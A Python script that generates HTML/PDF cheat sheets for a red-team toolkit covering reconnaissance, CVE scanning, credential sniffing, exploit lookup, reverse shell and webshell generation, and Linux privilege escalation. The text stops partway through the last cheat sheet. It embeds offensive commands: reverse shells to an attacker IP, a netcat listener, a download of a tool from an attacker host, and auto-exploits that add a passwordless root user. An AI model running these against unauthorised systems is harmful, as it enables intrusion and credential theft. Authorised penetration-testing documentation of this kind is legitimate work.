#!/usr/bin/env python3
"""Generates HTML cheatsheets and PDFs for every red_team tool folder."""

import subprocess, os

BASE = os.path.dirname(os.path.abspath(__file__))
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

CSS = """
  body{font-family:Arial,Helvetica,sans-serif;max-width:1180px;margin:36px auto;padding:0 22px;color:#2c2c2a;line-height:1.6}
  h1{font-size:22px;font-weight:500;margin-bottom:4px}
  .intro{color:#5f5e5a;margin-top:0}
  .layout{display:flex;gap:36px;align-items:flex-start;flex-wrap:wrap;margin-top:20px}
  .diagram{flex:1 1 360px;min-width:300px;position:sticky;top:20px}
  .steps{flex:1 1 440px;min-width:320px}
  .step{margin-top:4px;margin-bottom:24px;page-break-inside:avoid}
  .step .label{font-weight:500;font-size:16px}
  .step p{margin:6px 0}
  pre{background:#f1efe8;border:1px solid #d3d1c7;border-radius:6px;padding:10px 12px;overflow-x:auto;font-size:13px;line-height:1.5}
  svg{display:block;max-width:100%;height:auto}
  .key{margin-top:28px;color:#5f5e5a;border-top:1px solid #d3d1c7;padding-top:14px}
  table{border-collapse:collapse;width:100%;margin-top:8px;font-size:13px}
  th{background:#f1efe8;border:1px solid #d3d1c7;padding:6px 10px;text-align:left;font-weight:500}
  td{border:1px solid #d3d1c7;padding:6px 10px;vertical-align:top}
  td:first-child{font-family:monospace;font-size:12px;white-space:nowrap}
  tr:nth-child(even) td{background:#faf9f6}
  .warn{background:#fff4e5;border:1px solid #e8a020;border-radius:6px;padding:8px 12px;font-size:13px;margin-bottom:14px;color:#7a4800}
"""

SVG_STYLES = """
  text{font-family:Arial,Helvetica,sans-serif}
  .th{font-size:14px;font-weight:500}
  .ts{font-size:12px}
  .gray .box{fill:#F1EFE8;stroke:#5F5E5A;stroke-width:.5}
  .gray .th{fill:#444441} .gray .ts{fill:#5F5E5A}
  .coral .box{fill:#FAECE7;stroke:#993C1D;stroke-width:.5}
  .coral .th{fill:#712B13} .coral .ts{fill:#993C1D}
  .blue .box{fill:#E6F1FB;stroke:#185FA5;stroke-width:.5}
  .blue .th{fill:#0C447C} .blue .ts{fill:#185FA5}
  .green .box{fill:#E8F5E9;stroke:#2E7D32;stroke-width:.5}
  .green .th{fill:#1B5E20} .green .ts{fill:#2E7D32}
  .arrow{stroke:#888780;stroke-width:1.5;fill:none}
"""

ARROW_MARKER = """<defs>
  <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
    <path d="M2 1L8 5L2 9" fill="none" stroke="#888780" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
  </marker>
</defs>"""

def svg_box(cls, x, y, w, h, title, subtitle, rx=4):
    mx, ty, sy = x + w//2, y + h//2 - 6, y + h//2 + 12
    return f"""<g class="{cls}">
  <rect class="box" x="{x}" y="{y}" width="{w}" height="{h}" rx="{rx}"/>
  <text class="th" x="{mx}" y="{ty}" text-anchor="middle">{title}</text>
  <text class="ts" x="{mx}" y="{sy}" text-anchor="middle">{subtitle}</text>
</g>"""

def arrow(x1, y1, x2, y2):
    return f'<line class="arrow" x1="{x1}" y1="{y1}" x2="{x2}" y2="{y2}" marker-end="url(#arrow)"/>'

def flow_svg(steps, height=600):
    """steps: list of (class, title, subtitle)"""
    boxes, gap, bh, bw, bx, y = [], 70, 54, 380, 140, 40
    for cls, title, subtitle in steps:
        boxes.append(svg_box(cls, bx, y, bw, bh, title, subtitle))
        ny = y + bh
        boxes.append(arrow(330, ny, 330, ny + 16))
        y += bh + 18
    inner = "\n".join(boxes)
    return f"""<svg xmlns="http://www.w3.org/2000/svg" width="680" height="{height}" viewBox="0 0 680 {height}">
<style>{SVG_STYLES}</style>
{ARROW_MARKER}
{inner}
</svg>"""

def html(title, intro, svg, steps_html, key):
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>{title}</title>
<style>{CSS}</style></head><body>
<h1>{title}</h1>
<p class="intro">{intro}</p>
<div class="layout">
<div class="diagram">{svg}</div>
<div class="steps">{steps_html}</div>
</div>
<p class="key">{key}</p>
</body></html>"""

def step(label, body):
    return f'<div class="step"><span class="label">{label}</span>{body}</div>\n'

def pre(code): return f"<pre>{code}</pre>"
def p(txt): return f"<p>{txt}</p>"
def warn(txt): return f'<div class="warn">{txt}</div>'

def table(headers, rows):
    ths = "".join(f"<th>{h}</th>" for h in headers)
    trs = "".join("<tr>" + "".join(f"<td>{c}</td>" for c in row) + "</tr>" for row in rows)
    return f"<table><tr>{ths}</tr>{trs}</table>"

def write_and_convert(folder, slug, html_content):
    html_path = os.path.join(folder, f"{slug}_not_public.html")
    pdf_path  = os.path.join(folder, f"{slug}.pdf")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_content)
    result = subprocess.run(
        [CHROME, "--headless", "--disable-gpu", "--no-pdf-header-footer", f"--print-to-pdf={pdf_path}", html_path],
        capture_output=True
    )
    status = "OK" if result.returncode == 0 else f"FAIL: {result.stderr.decode()[:100]}"
    print(f"  [{status}] {os.path.relpath(pdf_path, BASE)}")

# ─────────────────────────────────────────────────────────────────────────────
# 01 — email-enum
# ─────────────────────────────────────────────────────────────────────────────
def make_email_enum():
    folder = f"{BASE}/01_Reconnaissance/email-enum"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",         "python3 email_enum.py"),
        ("gray",  "2. Enter Target Name",          "First name + last name"),
        ("gray",  "3. Enter Target Domain",        "company.com"),
        ("coral", "4. Pattern Generation",         "14 email format permutations"),
        ("blue",  "5. MX Record Lookup",           "Finds the mail server for the domain"),
        ("blue",  "6. SMTP Verification",          "RCPT TO probe — no email sent"),
        ("green", "7. Results",                    "VALID / INVALID / UNKNOWN per address"),
    ], height=570)

    steps = (
        step("Step 1 — Install &amp; Run",
             p("Install dependencies and launch the tool:") +
             pre("pip install -r requirements.txt\npython3 email_enum.py") +
             p("Runs interactively — no flags needed.")) +
        step("Step 2 &amp; 3 — Enter Name and Domain",
             p("You will be prompted for:") +
             pre('First name:  john\nLast name:   doe\nDomain:      company.com') +
             p("The tool generates all common corporate email patterns from these three inputs.")) +
        step("Step 4 — Pattern Generation",
             p("14 permutations are generated automatically:") +
             table(["Pattern", "Example"],
                   [["first.last@domain", "john.doe@company.com"],
                    ["firstlast@domain",  "johndoe@company.com"],
                    ["flast@domain",      "jdoe@company.com"],
                    ["firstl@domain",     "johnd@company.com"],
                    ["f.last@domain",     "j.doe@company.com"],
                    ["first@domain",      "john@company.com"],
                    ["last@domain",       "doe@company.com"],
                    ["last.first@domain", "doe.john@company.com"],
                    ["first_last@domain", "john_doe@company.com"],
                    ["first-last@domain", "john-doe@company.com"]])) +
        step("Step 5 — MX Record Lookup",
             p("The tool resolves the domain's MX record to find its mail server before probing — no guessing.")) +
        step("Step 6 — SMTP Verification",
             p("Connects to the mail server and issues a <code>RCPT TO</code> command for each address. No email is ever sent.") +
             table(["Response", "Meaning"],
                   [["250", "VALID — address exists"],
                    ["550", "INVALID — address does not exist"],
                    ["other", "UNKNOWN — server is rate-limiting or greylisting"]])) +
        step("Step 7 — Reading Results",
             p("A summary table is printed at the end:") +
             pre("[+] VALID   john.doe@company.com\n[-] INVALID johndoe@company.com\n[?] UNKNOWN jdoe@company.com") +
             p("Valid addresses are the primary output — use them for phishing simulation, recon, or access testing."))
    )
    key = "Key idea: some mail servers disable SMTP probing (catch-all domains always return 250). If most results are VALID or UNKNOWN, the domain likely uses a catch-all — treat results as unverified."
    h = html("Email Enumeration — cheat sheet",
             "Generates corporate email permutations for a target and verifies them via SMTP — without sending a single email.",
             svg, steps, key)
    write_and_convert(folder, "email-enum-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 01 — subdomain-enum
# ─────────────────────────────────────────────────────────────────────────────
def make_subdomain_enum():
    folder = f"{BASE}/01_Reconnaissance/subdomain-enum"
    svg = flow_svg([
        ("gray",  "1. Install Tools",        "subfinder · assetfinder · sublist3r"),
        ("gray",  "2. Run the Script",       "./subdomain_enum.sh example.com"),
        ("coral", "3. Subfinder",            "Certificate transparency + APIs"),
        ("blue",  "4. Assetfinder",          "DNS + web crawl sources"),
        ("blue",  "5. Sublist3r",            "Search engines + brute-force"),
        ("green", "6. Merge &amp; Dedupe",   "sort -u → one clean output file"),
        ("green", "7. Results File",         "subdomains_example.com.txt"),
    ], height=570)

    steps = (
        step("Step 1 — Install the Three Tools",
             pre("# Subfinder\ngo install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\n\n# Assetfinder\ngo install github.com/tomnomnom/assetfinder@latest\n\n# Sublist3r\npip install sublist3r")) +
        step("Step 2 — Run",
             pre("chmod +x subdomain_enum.sh\n./subdomain_enum.sh example.com\n# also accepts full URLs:\n./subdomain_enum.sh https://example.com/anything")) +
        step("Step 3–5 — Three Tools, Different Sources",
             table(["Tool", "Data Sources", "Best for"],
                   [["Subfinder",   "Cert transparency, Shodan, VirusTotal, APIs", "Passive, fast, comprehensive"],
                    ["Assetfinder", "DNS records, web crawl, related assets",       "Finding related domains"],
                    ["Sublist3r",   "Google, Bing, Yahoo, DNSdumpster, crt.sh",    "Search engine enumeration"]])) +
        step("Step 6 — Merge &amp; Deduplicate",
             p("All three tool outputs are combined and deduplicated automatically with <code>sort -u</code>. You get one clean file with no duplicates.")) +
        step("Step 7 — Reading the Output",
             pre("[+] Running Subfinder...      Found 43 subdomains\n[+] Running Assetfinder...    Found 31 subdomains\n[+] Running Sublist3r...      Found 27 subdomains\n\n[*] Total unique subdomains:  61\n[*] Results saved to: subdomains_example.com.txt") +
             p("Open the results file and pipe into other tools:") +
             pre("cat subdomains_example.com.txt | httpx      # find live hosts\ncat subdomains_example.com.txt | nmap ...  # port scan them"))
    )
    key = "Key idea: no single tool finds everything — running all three and merging gives the best coverage. Subfinder usually finds the most, Assetfinder catches related assets the others miss."
    h = html("Subdomain Enumeration — cheat sheet",
             "Automates subdomain discovery by running Subfinder, Assetfinder, and Sublist3r in sequence, then merging all results.",
             svg, steps, key)
    write_and_convert(folder, "subdomain-enum-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 01 — the-harvester
# ─────────────────────────────────────────────────────────────────────────────
def make_harvester():
    folder = f"{BASE}/01_Reconnaissance/the-harvester"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",     "pip install -r requirements.txt"),
        ("gray",  "2. Set Target Domain",      "-d example.com"),
        ("coral", "3. Choose Sources",         "google · bing · crt · hackertarget"),
        ("blue",  "4. Email Scraping",         "Pulls emails from search results"),
        ("blue",  "5. Subdomain Discovery",    "Pulls subdomains from cert logs &amp; APIs"),
        ("green", "6. Results",                "Emails + subdomains printed &amp; saved"),
    ], height=490)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\npython3 the_harvester.py -d example.com")) +
        step("Step 2 — Flags",
             table(["Flag", "Description", "Example"],
                   [["-d", "Target domain (required)", "-d example.com"],
                    ["-s", "Sources to use (default: all)", "-s google,crt"],
                    ["-o", "Save output to file", "-o results.txt"]])) +
        step("Step 3 — Sources",
             table(["Source", "What it collects"],
                   [["google",       "Email addresses from Google search results"],
                    ["bing",         "Email addresses from Bing search results"],
                    ["crt",          "Subdomains from certificate transparency logs (crt.sh)"],
                    ["hackertarget", "Subdomains from HackerTarget DNS lookup API"]])) +
        step("Step 4 &amp; 5 — Reading Results",
             pre("Emails found:\n  admin@example.com\n  info@example.com\n  john.doe@example.com\n\nSubdomains found:\n  mail.example.com\n  vpn.example.com\n  dev.example.com") +
             p("Emails feed into phishing simulation and credential guessing. Subdomains feed into further scanning.")) +
        step("Run Examples",
             pre("# All sources\npython3 the_harvester.py -d example.com\n\n# Only cert transparency + bing\npython3 the_harvester.py -d example.com -s crt,bing\n\n# Save to file\npython3 the_harvester.py -d example.com -o results.txt"))
    )
    key = "Key idea: combine this with email-enum — use the harvester to find real email addresses and known subdomains, then use email-enum to guess additional addresses for people not yet found publicly."
    h = html("The Harvester — cheat sheet",
             "Passive OSINT tool for collecting emails and subdomains from Google, Bing, crt.sh, and HackerTarget.",
             svg, steps, key)
    write_and_convert(folder, "harvester-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 01 — whois-lookup
# ─────────────────────────────────────────────────────────────────────────────
def make_whois():
    folder = f"{BASE}/01_Reconnaissance/whois-lookup"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",    "pip install -r requirements.txt"),
        ("gray",  "2. Pass Target Domain",   "python3 whois_lookup.py example.com"),
        ("coral", "3. WHOIS Query",          "Queries WHOIS database for registration data"),
        ("blue",  "4. Parse Results",        "Extracts registrar, dates, nameservers, email"),
        ("green", "5. Output",               "Print to terminal or save as JSON"),
    ], height=415)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\npython3 whois_lookup.py example.com")) +
        step("Step 2 — Usage",
             pre("# Single domain\npython3 whois_lookup.py example.com\n\n# Multiple domains\npython3 whois_lookup.py example.com target.org\n\n# Save to JSON\npython3 whois_lookup.py example.com target.org -o results.json")) +
        step("Step 3 — What It Returns",
             table(["Field", "What it tells you"],
                   [["Registrar",         "Who the domain is registered with"],
                    ["Creation date",     "When the domain was first registered (age = trust signal)"],
                    ["Expiration date",   "When it expires — expiring soon = acquisition opportunity"],
                    ["Name servers",      "Hosting / DNS provider — reveals infrastructure"],
                    ["Registrant email",  "Contact email — useful for OSINT on the org"],
                    ["Country",           "Registrant country"],
                    ["DNSSEC",            "Whether the domain has DNSSEC enabled"]])) +
        step("Reading the Output",
             pre("Domain     : example.com\nRegistrar  : GoDaddy\nCreated    : 1995-08-14\nExpires    : 2025-08-13\nNameservers: ns1.example.com, ns2.example.com\nEmail      : admin@example.com\nCountry    : US\nDNSSEC     : unsigned") +
             p("A very young domain (days or weeks old) combined with suspicious content is a strong phishing indicator."))
    )
    key = "Key idea: domain age is one of the strongest signals. Phishing domains are almost always newly registered (under 30 days). Combine with the phishing-detector for URL risk scoring."
    h = html("WHOIS Lookup — cheat sheet",
             "Pulls WHOIS registration data for one or more domains — registrar, dates, nameservers, and registrant email.",
             svg, steps, key)
    write_and_convert(folder, "whois-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 02 — cve-scanner
# ─────────────────────────────────────────────────────────────────────────────
def make_cve_scanner():
    folder = f"{BASE}/02_Scanning_and_Enumeration/cve-scanner"
    svg = flow_svg([
        ("gray",  "1. Run the Scanner",      "python3 cve_scanner.py -t &lt;target&gt;"),
        ("coral", "2. Port Scan",            "Parallel TCP scan — finds open ports"),
        ("coral", "3. Banner Grabbing",      "Reads service banners from open ports"),
        ("blue",  "4. Version Detection",    "Parses banner for service name + version"),
        ("blue",  "5. NVD CVE Lookup",       "Queries NIST NVD API per detected service"),
        ("green", "6. Vulnerability Report", "Color-coded CVEs with CVSS scores"),
    ], height=490)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\n\n# Interactive mode\npython3 cve_scanner.py\n\n# Direct scan\npython3 cve_scanner.py -t 192.168.1.1\n\n# Custom ports\npython3 cve_scanner.py -t 192.168.1.1 -p 22,80,443,8080\n\n# Top-1000 scan\npython3 cve_scanner.py -t 192.168.1.1 --top1000")) +
        step("Step 2 — Port Scan",
             p("Scans common TCP ports in parallel using a thread pool. Default set covers 22 high-value ports (SSH, HTTP, HTTPS, SMB, RDP, MySQL, etc.). Use <code>-p</code> for custom ports or <code>--top1000</code> for full coverage.")) +
        step("Step 3 &amp; 4 — Banner Grabbing &amp; Version Detection",
             p("Connects to each open port and reads what the service sends back. Parses the banner with regex to extract:") +
             table(["Service", "What it looks for"],
                   [["OpenSSH",  "SSH-2.0-OpenSSH_8.9p1 → OpenSSH 8.9p1"],
                    ["Apache",   "Server: Apache/2.4.51 → Apache 2.4.51"],
                    ["nginx",    "Server: nginx/1.18.0 → nginx 1.18.0"],
                    ["MySQL",    "5.7.38-MySQL Community → MySQL 5.7.38"],
                    ["ProFTPD",  "220 ProFTPD 1.3.5e → ProFTPD 1.3.5e"]])) +
        step("Step 5 — NVD CVE Lookup",
             p("Queries the free NIST NVD API for each detected service + version. Returns up to 5 CVEs per service with:") +
             table(["Field", "Description"],
                   [["CVE ID",      "e.g. CVE-2021-41617"],
                    ["CVSS Score",  "0.0 – 10.0"],
                    ["Severity",    "CRITICAL / HIGH / MEDIUM / LOW"],
                    ["Description", "Short summary of the vulnerability"],
                    ["Link",        "Direct URL to the NVD page"]])) +
        step("Step 6 — Reading the Report",
             pre("[CRITICAL] CVE-2021-44228  Score: 10.0\n  Apache Log4j2 — Remote Code Execution (Log4Shell)\n  https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n\n[HIGH]     CVE-2022-22963  Score: 9.8\n  Spring Framework RCE via routing expressions") +
             p("Feed CVE IDs directly into exploit-suggester to find matching PoCs."))
    )
    key = "Key idea: this tool gives you a fast CVE map without touching a vulnerability scanner like Nessus. Feed CVE IDs into exploit-suggester for the next step."
    h = html("CVE Scanner — cheat sheet",
             "Scans a target, detects service versions via banner grabbing, and queries NIST NVD for known CVEs.",
             svg, steps, key)
    write_and_convert(folder, "cve-scanner-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 02 — dir-enum
# ─────────────────────────────────────────────────────────────────────────────
def make_dir_enum():
    folder = f"{BASE}/02_Scanning_and_Enumeration/dir-enum"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",    "python3 dir_enum.py -u &lt;URL&gt; -w &lt;wordlist&gt;"),
        ("coral", "2. Load Wordlist",        "Reads paths from wordlist file"),
        ("coral", "3. Threaded Requests",    "Hits &lt;URL&gt;/&lt;word&gt; on N threads"),
        ("blue",  "4. Filter Status Codes",  "200, 301, 403... configurable"),
        ("green", "5. Results",              "Found paths printed live + saved to file"),
    ], height=415)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\n\n# Basic scan\npython3 dir_enum.py -u http://target.com -w wordlist.txt\n\n# With extensions\npython3 dir_enum.py -u http://target.com -w wordlist.txt -e .php,.html,.bak\n\n# Save results\npython3 dir_enum.py -u http://target.com -w wordlist.txt -o found.txt")) +
        step("Step 2 — Flags",
             table(["Flag", "Description", "Default"],
                   [["-u", "Target URL (required)", "—"],
                    ["-w", "Wordlist file path (required)", "—"],
                    ["-t", "Number of threads", "20"],
                    ["-e", "Extensions to append (.php,.html)", "none"],
                    ["-s", "Status codes to show", "200,204,301,302,307,401,403"],
                    ["-o", "Save results to file", "none"],
                    ["-v", "Verbose — show all responses", "off"]])) +
        step("Step 3 — Wordlists",
             p("Use well-known security wordlists for best results:") +
             pre("# Built into Kali / Parrot\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n\n# Download SecLists\ngit clone https://github.com/danielmiessler/SecLists")) +
        step("Step 4 — Reading Results",
             pre("[200] http://target.com/admin          (1.2KB)\n[301] http://target.com/uploads  ->  /uploads/\n[403] http://target.com/.htaccess\n[200] http://target.com/login.php      (4.8KB)") +
             table(["Status", "Meaning", "Action"],
                   [["200", "Page exists and is accessible", "Investigate the content"],
                    ["301/302", "Redirect — note the destination", "Follow the redirect"],
                    ["403", "Exists but access denied", "Try other techniques to access"],
                    ["401", "Authentication required", "Try default creds"]]))
    )
    key = "Key idea: start with a small wordlist (common.txt, ~4k entries) for a fast overview, then run a larger list (medium, ~220k) for thorough coverage. Add extensions relevant to the tech stack (-e .php for PHP apps)."
    h = html("Directory Enumeration — cheat sheet",
             "Multithreaded web directory and file brute-forcer. Finds hidden paths, admin panels, and exposed files.",
             svg, steps, key)
    write_and_convert(folder, "dir-enum-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 02 — net-intel
# ─────────────────────────────────────────────────────────────────────────────
def make_net_intel():
    folder = f"{BASE}/02_Scanning_and_Enumeration/net-intel"
    svg = flow_svg([
        ("gray",  "1. Install tshark",       "brew install wireshark / apt install tshark"),
        ("gray",  "2. Choose Mode",          "pcap file  or  live capture"),
        ("coral", "3. Credential Extraction","HTTP Basic, FTP, Telnet, SMTP, POST forms"),
        ("blue",  "4. Device Mapping",       "IP · MAC · vendor · hostname · open ports"),
        ("blue",  "5. DNS Tracking",         "Every query and response"),
        ("green", "6. Suspicious Flags",     "DNS tunneling · DGA · cleartext cookies"),
        ("green", "7. Report",               "Saved to file or printed to terminal"),
    ], height=570)

    steps = (
        step("Step 1 — Install Dependencies",
             pre("# macOS\nbrew install wireshark\npip install -r requirements.txt\n\n# Linux\nsudo apt install tshark\npip install -r requirements.txt")) +
        step("Step 2 — Two Modes",
             pre("# Analyze an existing pcap file\npython3 net_intel.py pcap -f capture.pcap\npython3 net_intel.py pcap -f capture.pcapng -o report.txt\n\n# Live capture (requires root)\nsudo python3 net_intel.py live -i eth0\nsudo python3 net_intel.py live -i wlan0 -t 60 -o report.txt") +
             p("<code>-t</code> sets capture duration in seconds. Omit for indefinite capture (Ctrl+C to stop).")) +
        step("Step 3 — Credential Extraction",
             p("Automatically extracts cleartext credentials from:") +
             table(["Protocol", "What it extracts"],
                   [["HTTP Basic Auth", "Username + password from Authorization header"],
                    ["FTP",             "USER and PASS commands"],
                    ["Telnet",          "Username and password from session"],
                    ["SMTP AUTH",       "SMTP authentication credentials"],
                    ["HTTP POST",       "login/password fields from form submissions"]])) +
        step("Step 4 — Device Map",
             pre("IP             MAC               Vendor       Hostname      Ports\n10.10.10.5     AA:BB:CC:11:22:33  Dell Inc     DESKTOP-01    22,80,3389\n10.10.10.12    AA:BB:CC:44:55:66  Apple Inc    MacBook-Pro   —")) +
        step("Step 5 &amp; 6 — DNS Tracking &amp; Suspicious Flags",
             p("Every DNS query and response is logged. Suspicious patterns flagged automatically:") +
             table(["Flag", "What it means"],
                   [["DNS tunneling",    "Unusually large DNS queries — data may be exfiltrated via DNS"],
                    ["DGA domains",      "Random-looking domain names — sign of malware C2"],
                    ["Cleartext cookies","Session cookies visible in HTTP traffic (no HTTPS)"]]))
    )
    key = "Key idea: for live capture, use promiscuous mode on the interface for best coverage. Credentials only appear from unencrypted protocols — HTTPS traffic requires a MITM setup to inspect."
    h = html("Net Intel — cheat sheet",
             "Passive network intelligence tool. Analyzes pcap files or live traffic to extract credentials, map devices, and flag suspicious patterns.",
             svg, steps, key)
    write_and_convert(folder, "net-intel-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 03 — exploit-suggester
# ─────────────────────────────────────────────────────────────────────────────
def make_exploit_suggester():
    folder = f"{BASE}/03_Exploitation/exploit-suggester"
    svg = flow_svg([
        ("gray",  "1. Run with CVE IDs",     "python3 exploit_suggester.py -c CVE-XXXX-XXXXX"),
        ("coral", "2. NVD Severity Lookup",  "Pulls CVSS score from NIST NVD"),
        ("blue",  "3. Exploit-DB Search",    "Finds matching Exploit-DB entries"),
        ("blue",  "4. GitHub Search",        "Finds matching GitHub PoC repositories"),
        ("green", "5. Results",              "Exploits ranked by severity, with links"),
    ], height=415)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\n\n# Single CVE\npython3 exploit_suggester.py -c CVE-2021-44228\n\n# Multiple CVEs\npython3 exploit_suggester.py -c CVE-2021-44228 CVE-2022-26134\n\n# From file (one CVE per line)\npython3 exploit_suggester.py -f cves.txt\n\n# Save output to JSON\npython3 exploit_suggester.py -c CVE-2021-44228 -o results.json")) +
        step("Step 2 — Flags",
             table(["Flag", "Description"],
                   [["-c", "One or more CVE IDs on the command line"],
                    ["-f", "Path to a file with CVE IDs (one per line)"],
                    ["-o", "Save results to a JSON file"]])) +
        step("Step 3 — Workflow with CVE Scanner",
             p("The best workflow pairs this tool directly with the CVE scanner output:") +
             pre("# 1. Scan a target and save CVE IDs\npython3 cve_scanner.py -t 192.168.1.1 | grep CVE > cves.txt\n\n# 2. Find exploits for all found CVEs\npython3 exploit_suggester.py -f cves.txt -o exploits.json")) +
        step("Step 4 — Reading Results",
             pre("CVE-2021-44228  CVSS: 10.0  CRITICAL\n\n  [Exploit-DB]\n  ID: 50592 — Apache Log4j2 RCE (Log4Shell)\n  URL: https://www.exploit-db.com/exploits/50592\n\n  [GitHub]\n  lunasec-io/log4shell-poc  (2.1k stars)\n  https://github.com/lunasec-io/log4shell-poc") +
             p("Higher CVSS score + public PoC on GitHub = highest priority target."))
    )
    key = "Key idea: not every CVE has a public exploit. A CVSS 10 with no public PoC is still dangerous but harder to exploit quickly. A CVSS 7 with a working GitHub PoC is often more immediately actionable."
    h = html("Exploit Suggester — cheat sheet",
             "Takes CVE IDs and finds matching exploits across Exploit-DB and GitHub. Pairs directly with CVE scanner output.",
             svg, steps, key)
    write_and_convert(folder, "exploit-suggester-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 03 — payload-generator
# ─────────────────────────────────────────────────────────────────────────────
def make_payload_gen():
    folder = f"{BASE}/03_Exploitation/payload-generator"
    svg = flow_svg([
        ("gray",  "1. Run the Tool",         "python3 payload_generator.py"),
        ("gray",  "2. Choose Payload Type",  "revshell  or  webshell"),
        ("coral", "3. Set LHOST / LPORT",    "Your attacker IP and listening port"),
        ("blue",  "4. Choose Language",      "bash · python3 · powershell · php · ..."),
        ("blue",  "5. Optional: Encode",     "--b64 wraps payload in base64"),
        ("green", "6. Copy &amp; Use",       "Paste into target, start listener"),
    ], height=490)

    steps = (
        step("Step 1 — List Available Types",
             pre("python3 payload_generator.py list")) +
        step("Step 2 — Reverse Shells",
             pre("# Bash\npython3 payload_generator.py revshell -t bash -i 10.10.10.10 -p 4444\n\n# Python3\npython3 payload_generator.py revshell -t python3 -i 10.10.10.10 -p 4444\n\n# PowerShell\npython3 payload_generator.py revshell -t powershell -i 10.10.10.10 -p 4444\n\n# Base64-encoded (useful when special chars cause issues)\npython3 payload_generator.py revshell -t bash -i 10.10.10.10 -p 4444 --b64") +
             table(["Shell type", "When to use"],
                   [["bash",         "Linux target with bash available (most common)"],
                    ["nc / nc_mkfifo","When netcat is available on target"],
                    ["python3",      "When Python3 is installed on target"],
                    ["perl",         "Older Linux systems with Perl"],
                    ["php",          "Web server context — PHP available"],
                    ["powershell",   "Windows targets"],
                    ["powershell_b64","Windows — bypasses basic command restrictions"]])) +
        step("Step 3 — Webshells",
             pre("python3 payload_generator.py webshell -t php_simple\npython3 payload_generator.py webshell -t asp\npython3 payload_generator.py webshell -t jsp") +
             table(["Type", "Use case"],
                   [["php_simple",   "Upload to PHP web server, execute commands via ?cmd="],
                    ["php_passthru", "Alternative PHP webshell using passthru()"],
                    ["php_exec",     "Uses exec() — some servers have passthru disabled"],
                    ["asp",          "IIS / Windows web servers"],
                    ["aspx",         "ASP.NET applications"],
                    ["jsp",          "Java / Tomcat web servers"]])) +
        step("Step 4 — Start a Listener",
             p("Before deploying the payload, start a listener on your machine:") +
             pre("# Netcat\nnc -lvnp 4444\n\n# Or use reverse-shell-manager for multi-session\npython3 rsm.py -p 4444"))
    )
    key = "Key idea: always start your listener BEFORE deploying the payload. Use --b64 when the target environment strips or escapes special characters (common in web shells and command injection)."
    h = html("Payload Generator — cheat sheet",
             "Generates reverse shell payloads and webshells for all major languages and platforms.",
             svg, steps, key)
    write_and_convert(folder, "payload-generator-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 04 — auto_privesc-linux
# ─────────────────────────────────────────────────────────────────────────────
def make_privesc_linux():
    folder = f"{BASE}/04_Post_Exploitation/auto_privesc-linux"
    svg = flow_svg([
        ("gray",  "1. Transfer to Target",   "wget / curl from attacker HTTP server"),
        ("gray",  "2. Run the Script",       "python3 autoprivesc.py"),
        ("coral", "3. SUID / Sudo Scan",     "GTFOBins check on all found binaries"),
        ("coral", "4. Cron / PATH / LD_PRELOAD", "Checks writable scripts and env abuse"),
        ("blue",  "5. /etc/passwd / Caps",   "Writable passwd + capabilities scan"),
        ("green", "6. Auto-Exploit",         "Runs the exploit or prints exact command"),
        ("green", "7. Root Shell",           "If successful — verify with whoami"),
    ], height=570)

    steps = (
        step("Step 1 — Transfer to Target",
             p("On attacker machine, serve the script:") +
             pre("python3 -m http.server 8000") +
             p("On target machine, download it:") +
             pre("wget http://&lt;attacker-ip&gt;:8000/autoprivesc.py\n# or\ncurl http://&lt;attacker-ip&gt;:8000/autoprivesc.py -o autoprivesc.py")) +
        step("Step 2 — Run",
             pre("python3 autoprivesc.py\n\n# Scan only, no exploitation\npython3 autoprivesc.py --no-exploit\n\n# Save findings to file\npython3 autoprivesc.py -o findings.txt")) +
        step("Step 3–5 — Vectors Checked",
             table(["#", "Vector", "What it checks", "Auto-exploits"],
                   [["1", "SUID Binaries",     "40+ GTFOBins database",                  "Prints exact GTFOBins command"],
                    ["2", "Sudo Misconfigs",   "NOPASSWD, dangerous binaries, wildcards", "Runs matching GTFOBins sudo command"],
                    ["3", "Writable Cron",     "Cron paths + scripts called by cron",     "Injects chmod +s /bin/bash payload"],
                    ["4", "LD_PRELOAD",        "env_keep+=LD_PRELOAD in sudo config",     "Compiles malicious .so"],
                    ["5", "Writable passwd",   "Write access to /etc/passwd",             "Adds passwordless root user"],
                    ["6", "Capabilities",      "cap_setuid, cap_setgid on binaries",      "Generates capability exploit"],
                    ["7", "PATH Hijacking",    "Writable PATH dirs + SUID relative calls","Plants fake binary"]])) +
        step("Step 6 — After Exploitation",
             pre("# Verify root\nwhoami\nid\n\n# If chmod +s /bin/bash was used:\n/bin/bash -p\n\n# If /etc/passwd was modified:\nsu rootme  # password: pwned"))
    )
    key = "Key idea: always run --no-exploit first on important targets to assess what vectors exist before triggering anything. Some exploits (writable cron, LD_PRELOAD) are noisy and may alert defenders."
    h = html("AutoPrivEsc Linux — cheat sheet",
